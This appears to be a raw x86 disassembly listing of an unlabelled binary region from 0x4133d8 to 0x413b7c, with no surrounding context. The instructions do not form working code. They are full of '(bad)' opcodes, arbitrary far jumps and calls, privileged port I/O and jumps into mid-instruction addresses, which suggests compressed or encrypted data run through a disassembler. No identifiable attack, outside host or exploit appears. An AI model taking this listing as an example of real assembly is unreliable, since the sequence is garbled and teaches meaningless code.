  4133d8:	fsub   st,st(5)
  4133da:	sbb    DWORD PTR [ebx+0x4ad7d53a],ebx
  4133e0:	push   cs
  4133e1:	popa   
  4133e2:	rcl    DWORD PTR [ebx+0x83c9710],0x23
  4133e9:	xchg   edx,eax
  4133ea:	jg     0x4133d3
  4133ec:	pop    ss
  4133ed:	shl    BYTE PTR [esi],1
  4133ef:	mov    esp,0xae5818e0
  4133f4:	(bad)  
  4133f5:	push   eax
  4133f6:	cli    
  4133f7:	ret    0xf3b2
  4133fa:	jbe    0x4133d0
  4133fc:	je     0x413479
  4133fe:	push   ebx
  4133ff:	xchg   ebx,eax
  413400:	fstp   QWORD PTR [eax-0x3e]
  413403:	retf   
  413404:	pop    es
  413405:	sbb    cl,cl
  413407:	lahf   
  413408:	loop   0x4133a8
  41340a:	bound  edx,QWORD PTR [edx-0x2652fef3]
  413410:	test   ecx,esi
  413412:	inc    BYTE PTR [esi+0x5610a32]
  413418:	repz inc ebx
  41341a:	pushf  
  41341b:	cmp    BYTE PTR [edi-0x64],bl
  41341e:	das    
  41341f:	imul   esp,DWORD PTR [esi+0x71bc7143],0x99026ab
  413429:	jne    0x413420
  41342b:	xor    eax,0xce8c10da
  413430:	leave  
  413431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413432:	sbb    BYTE PTR [ebx+0x66daad6d],ah
  413438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413439:	or     eax,0x278ce9ed
  41343e:	mov    bh,0xb5
  413440:	stc    
  413441:	fisub  DWORD PTR [ebp+0xe]
  413444:	(bad)  
  413445:	mov    ?,WORD PTR [ebp+0xb]
  413448:	lahf   
  413449:	lods   eax,DWORD PTR ds:[esi]
  41344a:	lock sbb BYTE PTR ds:0xbbd34d38,ch
  413451:	sbb    al,0xd1
  413453:	cmp    BYTE PTR [ebx+0x2a],ah
  413456:	pop    ebp
  413457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413458:	push   cs
  413459:	(bad)  
  41345a:	out    dx,eax
  41345b:	xor    ebx,eax
  41345d:	arpl   WORD PTR [ebp+0x9],si
  413460:	cmp    al,0x8e
  413462:	mov    cl,0xb2
  413464:	fmulp  st(6),st
  413466:	jo     0x41348f
  413468:	int    0xed
  41346a:	xchg   ebx,eax
  41346b:	and    ebp,DWORD PTR [ebx+0x18d530b]
  413471:	rcl    dh,1
  413473:	dec    BYTE PTR [edx-0x163000f3]
  413479:	dec    ecx
  41347a:	add    BYTE PTR [eax-0x3],ch
  41347d:	(bad)  
  41347e:	mov    esi,0xd375d066
  413483:	dec    eax
  413484:	mov    dl,0x34
  413486:	sar    BYTE PTR [ebx],cl
  413488:	ins    DWORD PTR es:[edi],dx
  413489:	fwait
  41348a:	push   ebp
  41348b:	jno    0x4134fa
  41348d:	cld    
  41348e:	xor    dh,bl
  413490:	bound  eax,QWORD PTR es:[esi+0x7e]
  413494:	mov    bh,0x9
  413496:	loopne 0x413449
  413498:	sub    eax,0x814e7814
  41349d:	dec    ecx
  41349e:	sbb    bh,dh
  4134a0:	ror    BYTE PTR [edi],1
  4134a2:	pop    es
  4134a3:	xchg   edx,eax
  4134a4:	call   0xb07d:0xe0a43cb6
  4134ab:	data16 out 0x8,al
  4134ae:	ins    DWORD PTR es:[edi],dx
  4134af:	pop    es
  4134b0:	sub    ah,cl
  4134b2:	fcomp  DWORD PTR cs:[ebx]
  4134b5:	dec    ecx
  4134b6:	nop
  4134b7:	arpl   bx,dx
  4134b9:	push   ebx
  4134ba:	pop    edx
  4134bb:	loopne 0x41344f
  4134bd:	scas   eax,DWORD PTR es:[edi]
  4134be:	cmc    
  4134bf:	or     BYTE PTR [eax-0x2e44abb3],al
  4134c5:	adc    BYTE PTR [edi],0x87
  4134c8:	lods   al,BYTE PTR ds:[esi]
  4134c9:	dec    esp
  4134ca:	ins    BYTE PTR es:[edi],dx
  4134cb:	mov    eax,0x318a4ab0
  4134d0:	jne    0x41354c
  4134d2:	and    cl,ah
  4134d4:	out    dx,al
  4134d5:	pop    ds
  4134d6:	push   0x73
  4134d8:	add    dh,BYTE PTR [ecx+0x19]
  4134db:	aad    0xa7
  4134dd:	mov    eax,ds:0xa5b3bd0
  4134e2:	pop    es
  4134e3:	loopne 0x4134f7
  4134e5:	mov    edi,0xd35b2b61
  4134ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134eb:	mov    ds:0x4b8a153d,eax
  4134f0:	sub    eax,0xa358b5c3
  4134f5:	pop    edx
  4134f6:	dec    ebp
  4134f7:	sub    al,BYTE PTR [eax]
  4134f9:	push   esi
  4134fa:	int3   
  4134fb:	fwait
  4134fc:	pop    ecx
  4134fd:	stc    
  4134fe:	mov    dl,0xa5
  413500:	and    al,0xfb
  413502:	push   esp
  413503:	dec    eax
  413504:	lea    edx,[ecx]
  413506:	jp     0x41350b
  413508:	sbb    BYTE PTR [esi+esi*1+0x70d3b72d],cl
  41350f:	lock scas eax,DWORD PTR es:[edi]
  413511:	or     DWORD PTR [eax+0x7f],0x746ca51b
  413518:	retf   0xe45e
  41351b:	aam    0x66
  41351d:	les    esp,FWORD PTR [ecx-0x2cfa0f65]
  413523:	jnp    0x413525
  413525:	aas    
  413526:	cmp    DWORD PTR [edx-0x552a8261],eax
  41352c:	bound  esi,QWORD PTR [eax+0x49]
  41352f:	pop    es
  413530:	fwait
  413531:	pop    esp
  413532:	pop    ebx
  413533:	lock lock dec edi
  413536:	in     al,0x6d
  413538:	jbe    0x41351b
  41353a:	xchg   edi,eax
  41353b:	(bad)  
  41353c:	xchg   esp,eax
  41353d:	dec    edx
  41353e:	or     al,0xf
  413540:	popf   
  413541:	mov    ecx,0x5d9ce730
  413546:	icebp  
  413547:	sbb    DWORD PTR [edx+0x4ade9af4],edi
  41354d:	popf   
  41354e:	dec    eax
  41354f:	icebp  
  413550:	inc    esp
  413551:	fs subps xmm5,XMMWORD PTR gs:[ebx-0x80]
  413557:	cmp    ah,dl
  413559:	lock and edx,0x18
  41355d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41355e:	fdivr  st,st(5)
  413560:	mov    ds:0x59a6bb16,eax
  413565:	inc    esi
  413566:	mov    ds:0xe1a8a66a,al
  41356b:	cmp    al,0x87
  41356d:	call   0x612a40c1
  413572:	sub    esi,DWORD PTR [ebp-0x37fa66f7]
  413578:	sar    ah,cl
  41357a:	mov    bl,0x8a
  41357c:	xchg   ebx,eax
  41357d:	and    ah,0xce
  413580:	jmp    FWORD PTR [ebx]
  413582:	sbb    DWORD PTR [ecx+0x23],ebp
  413585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413586:	mov    al,BYTE PTR [ecx]
  413588:	sub    eax,edi
  41358a:	add    ebx,DWORD PTR [edi]
  41358c:	mov    ?,WORD PTR [eax]
  41358e:	pushf  
  41358f:	mov    esp,0x18771ecb
  413594:	sbb    al,0xfb
  413596:	sar    bh,1
  413598:	inc    eax
  413599:	xchg   esp,eax
  41359a:	enter  0xfea8,0xd4
  41359e:	xor    BYTE PTR [eax+0x42],al
  4135a1:	add    DWORD PTR ss:[esi],eax
  4135a4:	mov    ds:0x647eafb3,eax
  4135a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135aa:	adc    bl,BYTE PTR fs:[edx+0x4cb0e47]
  4135b1:	pop    edx
  4135b2:	pop    edx
  4135b3:	xchg   ebp,eax
  4135b4:	mov    WORD PTR [ebx+0x625a71],?
  4135ba:	adc    eax,0x80e3ebf7
  4135bf:	xor    ecx,0xa162cb08
  4135c5:	call   0x3fb4:0x1c6927c2
  4135cc:	sub    DWORD PTR [edx+edx*8],edx
  4135cf:	add    esp,DWORD PTR [ecx-0x21]
  4135d2:	leave  
  4135d3:	clc    
  4135d4:	xabort 0x9
  4135d7:	(bad)  
  4135d8:	jmp    0x500486c6
  4135dd:	(bad)  
  4135de:	shl    DWORD PTR [eax+0x1a],1
  4135e1:	bound  edx,QWORD PTR [eax+0x27]
  4135e4:	push   es
  4135e5:	stos   DWORD PTR es:[edi],eax
  4135e6:	repnz mov edi,cs
  4135e9:	mov    esi,0x6b6a4787
  4135ee:	ins    DWORD PTR es:[edi],dx
  4135ef:	(bad)  
  4135f1:	xor    DWORD PTR [eax+0x29],eax
  4135f4:	xchg   ebp,eax
  4135f5:	inc    ecx
  4135f6:	rcl    BYTE PTR [edi+ecx*4],1
  4135f9:	ror    DWORD PTR [ebp-0x2b],cl
  4135fc:	sub    dh,dl
  4135fe:	push   es
  4135ff:	mov    al,0xd2
  413601:	push   edx
  413602:	xor    al,0x21
  413604:	jnp    0x41361b
  413606:	pop    ds
  413607:	loopne 0x41367a
  413609:	xchg   cl,dl
  41360b:	sbb    BYTE PTR [esi-0xb],bh
  41360e:	nop
  41360f:	xor    DWORD PTR [edi+0x7e],edx
  413612:	mov    edx,DWORD PTR [edx-0x7c]
  413615:	retf   0x127a
  413618:	pop    ebp
  413619:	sbb    al,0x9a
  41361b:	ffreep st(6)
  41361d:	rcr    BYTE PTR [ebp-0x40e57fd8],cl
  413623:	jno    0x413689
  413625:	fwait
  413626:	inc    edi
  413627:	out    dx,al
  413628:	mov    eax,0xba3586e9
  41362d:	test   DWORD PTR [eax],eax
  41362f:	fs inc esp
  413631:	outs   dx,BYTE PTR ds:[esi]
  413632:	jmp    0xba07bd63
  413637:	inc    edx
  413638:	bound  esi,QWORD PTR [eax+edx*2+0x1d2083dd]
  41363f:	je     0x413625
  413641:	fcmovnbe st,st(3)
  413643:	add    al,0xca
  413645:	dec    esi
  413646:	add    eax,0xa09db4d7
  41364b:	adc    edx,DWORD PTR [esi-0x5f4364ac]
  413651:	sti    
  413652:	jmp    0x413662
  413654:	shr    BYTE PTR [ecx],0x31
  413657:	pop    ss
  413658:	or     BYTE PTR [ebx+0x17064f36],0xc9
  41365f:	mov    dh,bl
  413661:	or     al,0xc1
  413663:	(bad)  
  413665:	xor    eax,DWORD PTR [ecx+0x18]
  413668:	jae    0x413668
  41366a:	or     al,0x9b
  41366c:	mov    ah,0x66
  41366e:	dec    eax
  41366f:	adc    eax,0x9ec603b3
  413674:	int    0xd4
  413676:	xchg   ebx,eax
  413677:	pop    eax
  413678:	(bad)  
  413679:	shr    DWORD PTR ds:0x8ebfd579,cl
  41367f:	pop    esi
  413680:	int3   
  413681:	or     eax,0xdaf43a32
  413686:	or     eax,0xaefd4369
  41368b:	into   
  41368c:	leave  
  41368d:	arpl   WORD PTR [edi],bx
  41368f:	in     al,dx
  413690:	sbb    BYTE PTR [edx+edi*2+0x62100754],dl
  413697:	cmp    DWORD PTR [edx+0x2ce3a14e],eax
  41369d:	and    eax,0x7982fe55
  4136a2:	in     eax,dx
  4136a3:	xor    di,di
  4136a6:	pop    eax
  4136a7:	sbb    BYTE PTR [edi+ebx*8+0x6e],bh
  4136ab:	clc    
  4136ac:	ins    DWORD PTR es:[edi],dx
  4136ad:	cmp    DWORD PTR [esi+0x4f4d9ab4],0xffffffa9
  4136b4:	or     DWORD PTR [eax],ebp
  4136b6:	(bad)  
  4136b7:	fnstenv [ecx+0xeea05e2]
  4136bd:	outs   dx,BYTE PTR ds:[esi]
  4136be:	inc    esi
  4136bf:	out    dx,eax
  4136c0:	and    BYTE PTR [eax],ah
  4136c2:	ror    DWORD PTR [ebx],cl
  4136c4:	out    0x81,al
  4136c6:	cmp    al,BYTE PTR [edx]
  4136c8:	inc    edi
  4136c9:	mov    ds:0x7fbdd10f,eax
  4136ce:	repnz mov bl,al
  4136d1:	pusha  
  4136d2:	xchg   esp,eax
  4136d3:	push   cs
  4136d4:	xchg   ecx,eax
  4136d5:	jo     0x41370e
  4136d7:	hlt    
  4136d8:	mov    ebx,DWORD PTR [esp+edi*1+0x2e]
  4136dc:	pop    ds
  4136dd:	cmp    dl,BYTE PTR [ebx-0x3e]
  4136e0:	inc    ecx
  4136e1:	push   ebp
  4136e2:	addr16 test eax,0xef0c1cc7
  4136e8:	dec    edx
  4136e9:	fild   DWORD PTR [edx+0x69]
  4136ec:	inc    ecx
  4136ed:	mov    eax,ss:0xeff7a14e
  4136f3:	sbb    DWORD PTR [esi-0x33dc2474],ebx
  4136f9:	mov    ebx,0x2f578205
  4136fe:	(bad)  
  4136ff:	js     0x4136b7
  413701:	push   ss
  413702:	mov    edi,0x18a32eab
  413707:	rol    BYTE PTR [ebx-0x5],0xc
  41370b:	jno    0x4136bf
  41370d:	adc    edx,DWORD PTR [ecx]
  41370f:	(bad)  
  413711:	sub    eax,0xcfb180dd
  413716:	es je  0x4136d6
  413719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41371a:	and    al,0x19
  41371c:	cmc    
  41371d:	test   al,0xf7
  41371f:	pop    ds
  413720:	call   FWORD PTR [ebx]
  413722:	fwait
  413723:	mov    ds:0x147b2154,eax
  413728:	leave  
  413729:	sbb    edx,ecx
  41372b:	ror    BYTE PTR [ebp-0x60840722],0x74
  413732:	lods   eax,DWORD PTR ds:[esi]
  413733:	sbb    esp,ebx
  413735:	jns    0x41370d
  413737:	inc    eax
  413738:	inc    edx
  413739:	inc    ecx
  41373a:	cmp    eax,eax
  41373c:	push   es
  41373d:	mov    al,0xcd
  41373f:	(bad)  
  413740:	mov    edx,0xde13d2f7
  413745:	bnd jl 0x413710
  413748:	push   esi
  413749:	aad    0xac
  41374b:	mov    ebp,0x64244cf7
  413750:	dec    edi
  413751:	xor    edi,ebp
  413753:	push   ecx
  413754:	(bad)
  413758:	repz hlt 
  41375a:	xor    BYTE PTR [ebx+eiz*4],ah
  41375d:	and    esi,edi
  41375f:	fwait
  413760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413761:	mov    esp,0x7f9e17d6
  413766:	repnz add DWORD PTR [ecx],eax
  413769:	mov    eax,0x30afec98
  41376e:	add    ebp,eax
  413770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413771:	push   0xffffffa5
  413773:	sbb    DWORD PTR [ebp+edi*2+0x48],edx
  413777:	push   esp
  413778:	push   eax
  413779:	cmp    edx,esi
  41377b:	pusha  
  41377c:	dec    edx
  41377d:	and    DWORD PTR [ebx+eax*2-0x55caf414],esp
  413784:	call   0x36f4:0x4b4bf6c0
  41378b:	lea    edx,[eax]
  41378d:	bound  esp,QWORD PTR [eax-0x45]
  413790:	stc    
  413791:	inc    esi
  413792:	and    cl,BYTE PTR [esi]
  413794:	lock movd mm0,ebx
  413798:	stos   DWORD PTR es:[edi],eax
  413799:	fisttp DWORD PTR [ecx]
  41379b:	(bad)  
  41379c:	cmc    
  41379d:	pop    ss
  41379e:	or     eax,0xd9f64b27
  4137a3:	cs jle 0x41375d
  4137a6:	xchg   ecx,eax
  4137a7:	push   ecx
  4137a8:	aam    0x11
  4137aa:	xchg   ah,dh
  4137ac:	test   BYTE PTR [ebp-0x1a],dh
  4137af:	sub    bl,BYTE PTR [ecx]
  4137b1:	test   DWORD PTR [eax+0x8],ebp
  4137b4:	add    esp,DWORD PTR [ebx+ecx*8+0x1b6c49d3]
  4137bb:	test   al,0x59
  4137bd:	ss retf 
  4137bf:	cmp    eax,0x8781ed76
  4137c4:	sahf   
  4137c5:	sub    eax,0x7cab5c7b
  4137ca:	jb     0x41384a
  4137cc:	jo     0x413848
  4137ce:	sub    DWORD PTR [edi+0x59557578],0x70
  4137d5:	aas    
  4137d6:	and    al,0xea
  4137d8:	adc    DWORD PTR [esi+0x5a8a322d],0xffffffab
  4137df:	stos   BYTE PTR es:[edi],al
  4137e0:	mov    esp,DWORD PTR [ebx+0x1afebdd3]
  4137e6:	xchg   ecx,eax
  4137e7:	fwait
  4137e8:	mov    eax,0xb7161e13
  4137ed:	jo     0x4137cd
  4137ef:	lea    ecx,[esi+0x42e6f568]
  4137f5:	lahf   
  4137f6:	aaa    
  4137f7:	enter  0x2638,0xa8
  4137fb:	add    al,0x34
  4137fd:	or     DWORD PTR [edi],0x21cfad20
  413803:	imul   edx,ebp,0x6cc7ed55
  413809:	inc    edx
  41380a:	and    eax,0x44226620
  41380f:	sub    DWORD PTR [ebp-0x706b510],eax
  413815:	stos   BYTE PTR es:[edi],al
  413816:	and    BYTE PTR [esi+0x2],al
  413819:	mov    esp,0x8a42953f
  41381e:	pop    edi
  41381f:	push   edi
  413820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413821:	inc    eax
  413822:	shl    DWORD PTR [ebp-0x378d35a2],0x45
  413829:	cmp    DWORD PTR [eax-0x1033829b],esi
  41382f:	out    0x0,eax
  413831:	sub    eax,DWORD PTR [ecx]
  413833:	jno    0x413845
  413835:	test   al,0x3d
  413837:	mov    edi,0x35d5e110
  41383c:	sbb    DWORD PTR [ecx+ecx*2-0x6ad3e329],edi
  413843:	das    
  413844:	sub    al,0x15
  413846:	and    eax,0xebf9d5b4
  41384b:	add    al,0x75
  41384d:	jns    0x41380c
  41384f:	cmp    al,0xba
  413851:	shl    esi,cl
  413853:	hlt    
  413854:	neg    BYTE PTR [ecx-0x775a3ba6]
  41385a:	push   eax
  41385b:	rol    BYTE PTR [eax],0x6a
  41385e:	xchg   dh,dh
  413860:	cmp    BYTE PTR [esi+0x35],dh
  413863:	faddp  st(7),st
  413865:	cdq    
  413866:	adc    ah,BYTE PTR [ebp-0x77996728]
  41386c:	add    esi,ebp
  41386e:	inc    edi
  41386f:	xor    eax,0x63679dfa
  413874:	sbb    cl,ah
  413876:	mov    edx,0xd01c6d11
  41387b:	outs   dx,BYTE PTR ds:[esi]
  41387c:	mov    ah,0x3f
  41387e:	or     eax,esi
  413880:	neg    ecx
  413882:	and    ebx,DWORD PTR [esi-0x4]
  413885:	or     dl,BYTE PTR [esi+0x4]
  413888:	xchg   edi,eax
  413889:	inc    esi
  41388a:	sbb    al,0x1b
  41388c:	test   DWORD PTR [eax-0x13],eax
  41388f:	mov    WORD PTR [eax+0x2a],ss
  413892:	loop   0x4138a6
  413894:	stc    
  413895:	div    ebx
  413897:	cmp    al,0x7a
  413899:	mov    esp,ebp
  41389b:	(bad)  
  41389c:	loopne 0x413879
  41389e:	repnz push ecx
  4138a0:	pop    DWORD PTR [edi]
  4138a2:	mov    dh,0x64
  4138a4:	jb     0x413895
  4138a6:	outs   dx,DWORD PTR gs:[esi]
  4138a8:	pop    ebp
  4138a9:	ins    BYTE PTR es:[edi],dx
  4138aa:	mov    ebp,DWORD PTR [edi+0x6af347e2]
  4138b0:	leave  
  4138b1:	or     BYTE PTR [ebx],dh
  4138b3:	fs repnz es mov ch,0x8
  4138b8:	fisubr WORD PTR gs:[esi]
  4138bb:	loopne 0x41389c
  4138bd:	add    DWORD PTR [esi+0x1d2d3a26],0x73472d44
  4138c7:	pop    ss
  4138c8:	xor    DWORD PTR [esp+edi*4-0xf],ebp
  4138cc:	ficom  WORD PTR [eax]
  4138ce:	or     dh,BYTE PTR [eax+0x3dfdbe1e]
  4138d4:	add    bh,BYTE PTR [edx+0x47f1f54b]
  4138da:	jmp    0x5c43554
  4138df:	hlt    
  4138e0:	ror    cl,0xe0
  4138e3:	adc    DWORD PTR [edi+0x7a3fcbe6],esi
  4138e9:	xor    BYTE PTR [esi-0x3606b475],dh
  4138ef:	and    dh,BYTE PTR [edi+edx*1-0xf]
  4138f3:	cmp    BYTE PTR [esi],bl
  4138f5:	(bad)  
  4138f6:	cmp    DWORD PTR [ecx],esp
  4138f8:	nop
  4138f9:	sub    DWORD PTR [eax+0x5e38099d],edx
  4138ff:	jbe    0x413910
  413901:	out    0x6b,al
  413903:	sub    BYTE PTR [ebx],dl
  413905:	add    ecx,DWORD PTR [esi+0x6f418912]
  41390b:	xlat   BYTE PTR ds:[ebx]
  41390c:	or     ah,BYTE PTR [edx]
  41390e:	jmp    0xb2d2:0xc91796ac
  413915:	gs mov dh,0xac
  413918:	and    BYTE PTR [esi+0x50],dh
  41391b:	aaa    
  41391c:	xchg   DWORD PTR [eax+0x21],ebx
  41391f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413920:	test   DWORD PTR [edx],esi
  413922:	sti    
  413923:	dec    esi
  413924:	sbb    eax,0xfea0c1aa
  413929:	xchg   BYTE PTR [edx+0x7bfccd2],bl
  41392f:	es sub bl,dh
  413932:	add    al,0x44
  413934:	loop   0x4138f5
  413936:	mov    ch,0x19
  413938:	mov    ah,0x65
  41393a:	inc    ebp
  41393b:	xor    al,0x2e
  41393d:	(bad)  
  41393e:	pop    ecx
  41393f:	stos   DWORD PTR es:[edi],eax
  413940:	push   eax
  413941:	les    ebx,FWORD PTR [edi]
  413943:	sbb    al,0xa8
  413945:	jmp    0xdff8:0xdd74d83c
  41394c:	push   es
  41394d:	xor    BYTE PTR [eax],0xfe
  413950:	test   DWORD PTR [ecx+eax*1+0x5c],ecx
  413954:	ins    BYTE PTR es:[edi],dx
  413955:	mov    edx,?
  413957:	call   0x20ba:0x5cddf63f
  41395e:	add    BYTE PTR [esi+0x28cb7113],bh
  413964:	ret    
  413965:	fs jmp 0x413963
  413968:	dec    esp
  413969:	in     al,dx
  41396a:	mov    cl,0xb8
  41396c:	outs   dx,BYTE PTR ds:[esi]
  41396d:	jmp    0xf071:0xd2bc310e
  413974:	push   ecx
  413975:	addr16 mov cl,dl
  413978:	and    bl,bh
  41397a:	fsub   QWORD PTR [ecx+0x16]
  41397d:	ins    BYTE PTR es:[edi],dx
  41397e:	xchg   BYTE PTR [ebx-0x76],cl
  413981:	sub    DWORD PTR [ecx],ebp
  413983:	xor    eax,0x7c26eb08
  413988:	dec    ebx
  413989:	cmc    
  41398a:	test   eax,0xa389cbab
  41398f:	pop    eax
  413990:	les    esi,FWORD PTR [ebp-0x58]
  413993:	cmp    DWORD PTR gs:[eax],esi
  413996:	int3   
  413997:	xlat   BYTE PTR ds:[ebx]
  413998:	popf   
  413999:	jne    0x41396b
  41399b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41399c:	lea    esi,[esi-0x7e8a5721]
  4139a2:	adc    al,0x3a
  4139a4:	bound  esp,QWORD PTR [ebp+0x22]
  4139a7:	ror    DWORD PTR [ebp+0x52],cl
  4139aa:	pop    ds
  4139ab:	outs   dx,BYTE PTR ds:[esi]
  4139ac:	daa    
  4139ad:	and    eax,0x5376fd07
  4139b2:	mov    bh,BYTE PTR [ecx+esi*1-0x7abbd531]
  4139b9:	sub    BYTE PTR [ebp-0x2cf06106],al
  4139bf:	add    eax,DWORD PTR [ebx+0x5a]
  4139c2:	ret    
  4139c3:	xchg   DWORD PTR [edx+edi*2+0x736e9f8e],ecx
  4139ca:	in     eax,dx
  4139cb:	inc    edx
  4139cc:	cmpxchg dl,dl
  4139cf:	mov    ebp,0x75914f47
  4139d4:	add    esp,DWORD PTR [ebx+0x4e1a9c7e]
  4139da:	xchg   bh,al
  4139dc:	or     eax,0xf097ab9f
  4139e1:	inc    ebp
  4139e2:	lods   al,BYTE PTR ds:[esi]
  4139e3:	aad    0x56
  4139e5:	mov    cl,BYTE PTR [ecx+ebx*8+0x1f]
  4139e9:	push   es
  4139ea:	rcr    BYTE PTR [eax+0x549a597c],1
  4139f0:	push   es
  4139f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f2:	in     al,dx
  4139f3:	cli    
  4139f4:	sub    eax,0x9bec44de
  4139f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139fa:	push   eax
  4139fb:	or     al,0x81
  4139fd:	xchg   edx,eax
  4139fe:	cmp    al,0x28
  413a00:	nop
  413a01:	sub    ch,BYTE PTR [ecx-0x1fa440c0]
  413a07:	jns    0x413a88
  413a09:	dec    edx
  413a0a:	outs   dx,BYTE PTR ds:[esi]
  413a0b:	cwde   
  413a0c:	mov    edx,0x4fd5dadc
  413a11:	adc    ch,ch
  413a13:	mov    ah,0x67
  413a15:	mov    ds:0xa3529d6b,eax
  413a1a:	out    dx,al
  413a1b:	adc    ch,cl
  413a1d:	xchg   BYTE PTR [eax+0x26],dl
  413a20:	sti    
  413a21:	out    dx,eax
  413a22:	add    BYTE PTR [ebp-0x9],cl
  413a25:	rcr    BYTE PTR [edx],1
  413a27:	mov    al,0xcd
  413a29:	mov    BYTE PTR [ecx-0x36dbadde],0xa2
  413a30:	sbb    bl,BYTE PTR [ecx-0x4ca5322e]
  413a36:	dec    edx
  413a37:	lods   al,BYTE PTR ds:[esi]
  413a38:	xor    DWORD PTR [ecx+0x6701c712],esi
  413a3e:	(bad)  [ebx+0x3ed0ba20]
  413a44:	jno    0x413a65
  413a46:	push   ss
  413a47:	dec    eax
  413a48:	jnp    0x413aab
  413a4a:	jae    0x413a1a
  413a4c:	dec    esp
  413a4d:	push   eax
  413a4e:	cs mov ebx,0x3143f20a
  413a54:	out    dx,eax
  413a55:	mov    BYTE PTR [edx+0x2c62f080],dl
  413a5b:	lods   al,BYTE PTR ds:[esi]
  413a5c:	cmp    eax,DWORD PTR [esi]
  413a5e:	out    dx,al
  413a5f:	xor    eax,0x27567105
  413a64:	dec    esp
  413a65:	ror    DWORD PTR [edi],1
  413a67:	outs   dx,DWORD PTR ds:[esi]
  413a68:	push   ds
  413a69:	repnz ss aaa 
  413a6c:	cmp    eax,0x66153e36
  413a71:	int    0x1b
  413a73:	xchg   ebp,eax
  413a74:	sbb    cl,BYTE PTR [esi]
  413a76:	pop    ebp
  413a77:	sub    al,0xfa
  413a79:	inc    esp
  413a7a:	out    dx,al
  413a7b:	xchg   BYTE PTR [eax+0x79],al
  413a7e:	or     al,0x3d
  413a80:	jge    0x413ab2
  413a82:	xchg   edx,eax
  413a83:	pop    esp
  413a84:	mov    edx,0x4d558f14
  413a89:	push   0x76
  413a8b:	icebp  
  413a8c:	xor    al,0xe3
  413a8e:	leave  
  413a8f:	pop    esi
  413a90:	std    
  413a91:	push   edi
  413a92:	jecxz  0x413af2
  413a94:	aad    0xe6
  413a96:	pop    ss
  413a97:	mov    dh,bl
  413a99:	xlat   BYTE PTR ds:[ebx]
  413a9a:	cmp    ch,dh
  413a9c:	pop    ebp
  413a9d:	stos   DWORD PTR es:[edi],eax
  413a9e:	scas   al,BYTE PTR es:[edi]
  413a9f:	push   edi
  413aa0:	pop    ecx
  413aa1:	jb     0x413a9d
  413aa3:	add    esp,ebx
  413aa5:	push   es
  413aa6:	sub    BYTE PTR [edi-0x2a8d23b6],dh
  413aac:	hlt    
  413aad:	or     edx,0x3ed58fcd
  413ab3:	sub    eax,0xabaa33b4
  413ab8:	jge    0x413ad8
  413aba:	rcr    ah,0x36
  413abd:	clc    
  413abe:	out    dx,al
  413abf:	addr16 clc 
  413ac1:	ret    
  413ac2:	ins    DWORD PTR es:[edi],dx
  413ac3:	or     dh,BYTE PTR [edx]
  413ac5:	dec    esp
  413ac6:	push   ebx
  413ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ac8:	retf   0xa115
  413acb:	cmp    esp,DWORD PTR [ebx]
  413acd:	mov    esp,0xf5ecc9d8
  413ad2:	xchg   ebp,eax
  413ad3:	imul   esi,DWORD PTR [eax],0xb65080f
  413ad9:	jbe    0x413ac3
  413adb:	xor    DWORD PTR [edx],ecx
  413add:	mov    eax,ds:0xd2429df4
  413ae2:	xchg   BYTE PTR [ebp+0x58],al
  413ae5:	jnp    0x413ac1
  413ae7:	lds    edx,FWORD PTR [esi]
  413ae9:	xor    eax,0x179a6bc8
  413aee:	pop    esi
  413aef:	fdivr  QWORD PTR [edx]
  413af1:	jle    0x413b5c
  413af3:	and    al,0x8b
  413af5:	jl     0x413a9e
  413af7:	jns    0x413abf
  413af9:	pop    eax
  413afa:	sub    BYTE PTR [ecx],cl
  413afc:	pop    es
  413afd:	aaa    
  413afe:	jnp    0x413b74
  413b00:	cwde   
  413b01:	gs hlt 
  413b03:	push   ss
  413b04:	sbb    al,0x6e
  413b06:	sbb    DWORD PTR [edx-0x69],esi
  413b09:	cwde   
  413b0a:	cmp    edi,0x5f
  413b0d:	or     edx,ecx
  413b0f:	sub    ah,BYTE PTR [esi]
  413b11:	add    eax,eax
  413b13:	mul    DWORD PTR [ecx+edx*1]
  413b16:	add    edx,DWORD PTR [esi-0x3f]
  413b19:	vmread eax,ebx
  413b1c:	mov    bl,0x86
  413b1e:	cmp    al,0x8c
  413b20:	jae    0x413aed
  413b22:	push   ebp
  413b23:	fidivr DWORD PTR [esi+0x13]
  413b26:	int    0x8f
  413b28:	mov    dl,0x29
  413b2a:	pop    edx
  413b2b:	sub    DWORD PTR [ecx],ecx
  413b2d:	loopne 0x413b99
  413b2f:	fisttp QWORD PTR [ecx-0x59]
  413b32:	call   0x67ee:0x762f6b14
  413b39:	mov    eax,0x3abb5fed
  413b3e:	adc    dh,al
  413b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b41:	mov    ch,0x9b
  413b43:	jae    0x413b1b
  413b45:	push   cs
  413b46:	out    0x4,al
  413b48:	scas   eax,DWORD PTR es:[edi]
  413b49:	pop    edi
  413b4a:	and    BYTE PTR [eax+0x41c1e4e],ah
  413b50:	inc    eax
  413b51:	xlat   BYTE PTR ds:[ebx]
  413b52:	mov    dh,0xc5
  413b54:	jb     0x413b7c
  413b56:	pop    es
  413b57:	aad    0x61
  413b59:	xchg   esi,eax
  413b5a:	pusha  
  413b5b:	mov    DWORD PTR [edi+eiz*1+0x3b7f060a],ebx
  413b62:	jmp    0x2926:0x3f67
  413b68:	shl    DWORD PTR [esi-0x26],cl
  413b6b:	pop    ebp
  413b6c:	mov    eax,ds:0xa302a6bd
  413b71:	jl     0x413af8
  413b73:	dec    ecx
  413b74:	(bad)  
  413b75:	jne    0x413b72
  413b77:	and    eax,DWORD PTR [ebp+0x7b]
  413b7a:	je     0x413b41
  413b7c:	pop    eax
